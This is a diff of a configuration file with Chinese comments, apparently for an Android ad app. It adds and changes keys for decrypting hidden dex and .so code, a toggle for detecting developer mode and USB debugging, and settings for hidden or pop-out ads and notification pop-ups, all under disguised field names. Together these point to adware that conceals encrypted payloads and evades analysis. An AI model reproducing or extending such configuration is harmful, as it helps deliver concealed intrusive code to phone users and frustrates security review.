@@ -7,6 +7,8 @@
   "fb_info_id": "3616318175247400-3616318175247400",
   //是否上报日志 true 和false
   "fish_status": "true",
+  // 用户分类
+  "user_tt": "aaa",
   // B配置都不要下面的数据
   //广告检测间隔、定时触发间隔 单位秒,
   //广告显示间隔 单位秒,
@@ -23,8 +25,10 @@
   "dam_cor_id1": "366C94B8A3DAC162BC34E2A27DE4F130",
   // 广告id 低价值
   "dam_cor_id2": "4BBD6DA07165E8D246D22E1093D87C0F",
-  // 解密dex的key
-  "heron_as_k": "TY12op90LiuMJ890",
+  //路径和解密dex的key
+  "heron_as_k": "f1.A0TY12op90LiuMJ890",
+  // 是否检测开发者和USB
+  "heron_che": false,
   // 解密so的key
   "viper_as_k": "TYop123UIjz2J890",
   // 隐藏/外弹/广播/文件开关 和So的信息依依对应
@@ -34,3 +38,27 @@
 //android.os.Build.VERSION_CODES.Q
 //Android 10 奔溃多弹通知栏，通知栏高度不对 ，主要机型xiaomi、Samsung、Huawei、vivo
 
+// 配置A
+{
+  "boating_t": 80,
+  "fishing": 99,
+  "fb_info_id": "3616318175247400-3616318175247400",
+  "fish_status": "true",
+  "user_tt": "aaa",
+  "heron_che": false,
+  "fish_time_go": "30-30-60-8-16-80-500-800-40-10",
+  "dam_cor_id1": "366C94B8A3DAC162BC34E2A27DE4F130",
+  "dam_cor_id2": "4BBD6DA07165E8D246D22E1093D87C0F",
+  "heron_as_k": "f1.A0TY12op90LiuMJ890",
+  "viper_as_k": "TYop123UIjz2J890",
+  "salmon": "Valley-Bank-Lagoon-Creek"
+}
+
+// 配置B
+{
+  "boating_t": 77,
+  "fishing": 99,
+  "fb_info_id": "3616318175247400-3616318175247400",
+  "fish_status": "true",
+  "user_tt": "bbb"
+}
